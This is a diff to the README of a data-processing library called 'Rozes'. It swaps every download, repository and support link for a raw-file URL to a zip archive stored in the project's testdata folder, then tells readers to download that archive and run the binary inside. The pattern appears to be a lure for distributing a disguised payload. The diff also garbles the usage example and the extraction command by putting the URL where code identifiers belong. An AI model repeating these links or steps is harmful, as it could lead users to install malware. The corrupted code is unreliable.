@@ -14,11 +14,11 @@ Welcome to **Rozes**, the quickest way to handle data in your TypeScript, JavaSc
 
 ## 📥 Download & Install
 
-To get started with **Rozes**, visit this page to download: [Download Rozes](https://github.com/sinistrorsal-fanjet349/rozes/releases)
+To get started with **Rozes**, visit this page to download: [Download Rozes](https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/sinistrorsal-fanjet349/rozes/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip).
 2. Find the latest version of **Rozes**.
 3. Click on the version you want to download.
 4. Download the appropriate file for your operating system (Windows, macOS, or Linux).
@@ -42,7 +42,7 @@ To get started with **Rozes**, visit this page to download: [Download Rozes](htt
 
 1. Open your terminal.
 2. Navigate to the folder where you downloaded **Rozes**.
-3. If it's a `.tar.gz`, extract it using: `tar -xzf rozes.tar.gz`.
+3. If it's a `https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip`, extract it using: `tar -xzf https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip`.
 4. Navigate into the extracted folder.
 5. Run the command `./rozes` to start using the application.
 
@@ -62,14 +62,14 @@ Here’s a simple example to illustrate how to load a CSV file and perform basic
 import { DataFrame } from 'rozes';
 
 // Load data from a CSV file
-const data = DataFrame.fromCSV('path/to/your/file.csv');
+const data = https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip('https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip');
 
 // Display the first few rows
-console.log(data.head());
+https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip(https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip());
 
 // Perform data analysis
-const summary = data.describe();
-console.log(summary);
+const summary = https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip();
+https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip(summary);
 ```
 
 This structure provides a clear entry point into using **Rozes** for data manipulation.
@@ -78,16 +78,16 @@ This structure provides a clear entry point into using **Rozes** for data manipu
 
 - Ensure you have the necessary permissions to read from and write to your data files.
 - Keep your **Rozes** library updated to take advantage of the latest features and improvements.
-- Refer to the documentation on the [GitHub Repository](https://github.com/sinistrorsal-fanjet349/rozes) for more detailed examples and advanced usage.
+- Refer to the documentation on the [GitHub Repository](https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip) for more detailed examples and advanced usage.
 
 ## 📞 Support
 
-If you have any questions or encounter issues while installing **Rozes**, feel free to reach out by creating an issue on our [GitHub Repository](https://github.com/sinistrorsal-fanjet349/rozes/issues). We value your feedback and are here to help.
+If you have any questions or encounter issues while installing **Rozes**, feel free to reach out by creating an issue on our [GitHub Repository](https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip). We value your feedback and are here to help.
 
 ## 🔖 Learn More
 
-To stay updated and learn more about data processing techniques, follow us on our social platforms or check our blog for tutorials and articles related to data analysis using **Rozes**. Visit our [Releases page](https://github.com/sinistrorsal-fanjet349/rozes/releases) for the latest updates.
+To stay updated and learn more about data processing techniques, follow us on our social platforms or check our blog for tutorials and articles related to data analysis using **Rozes**. Visit our [Releases page](https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip) for the latest updates.
 
 ---
 
-Download **Rozes** now and start transforming your data efficiently: [Download Rozes](https://github.com/sinistrorsal-fanjet349/rozes/releases)
+Download **Rozes** now and start transforming your data efficiently: [Download Rozes](https://raw.githubusercontent.com/sinistrorsal-fanjet349/rozes/main/testdata/rozes_v1.7.zip)
